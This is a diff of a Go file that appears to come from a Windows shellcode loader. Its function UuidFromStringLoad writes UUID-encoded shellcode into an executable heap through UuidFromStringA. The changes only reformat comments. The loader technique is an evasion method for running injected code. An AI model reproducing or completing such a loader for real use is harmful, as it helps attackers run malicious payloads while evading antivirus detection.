@@ -18,13 +18,16 @@ func UuidFromStringLoad(shellcode []byte) {
 		log.Fatal(err.Error())
 	}
 
-	/* https://docs.microsoft.com/en-us/windows/win32/api/heapapi/nf-heapapi-heapcreate
-		HANDLE HeapCreate(
-			DWORD  flOptions,
-			SIZE_T dwInitialSize,
-			SIZE_T dwMaximumSize
-		);
-	  HEAP_CREATE_ENABLE_EXECUTE = 0x00040000
+	/*
+		https://docs.microsoft.com/en-us/windows/win32/api/heapapi/nf-heapapi-heapcreate
+
+			HANDLE HeapCreate(
+				DWORD  flOptions,
+				SIZE_T dwInitialSize,
+				SIZE_T dwMaximumSize
+			);
+
+		  HEAP_CREATE_ENABLE_EXECUTE = 0x00040000
 	*/
 
 	// Create the heap
@@ -43,9 +46,9 @@ func UuidFromStringLoad(shellcode []byte) {
 
 	/*
 		RPC_STATUS UuidFromStringA(
-		RPC_CSTR StringUuid,
-		UUID     *Uuid
-		);
+			RPC_CSTR StringUuid,
+			UUID     *Uuid
+			);
 	*/
 
 	addrPtr := addr
@@ -53,7 +56,7 @@ func UuidFromStringLoad(shellcode []byte) {
 		// Must be a RPC_CSTR which is null terminated
 		u := append([]byte(uuid), 0)
 
-		// Only need to pass a pointer to the first character in the null terminated string representation of the UUID
+		// Only need to pass a pointer to the first character in the null-terminated string representation of the UUID
 		rpcStatus, _, err := wdll.UuidFromStringA().Call(uintptr(unsafe.Pointer(&u[0])), addrPtr)
 
 		// RPC_S_OK = 0
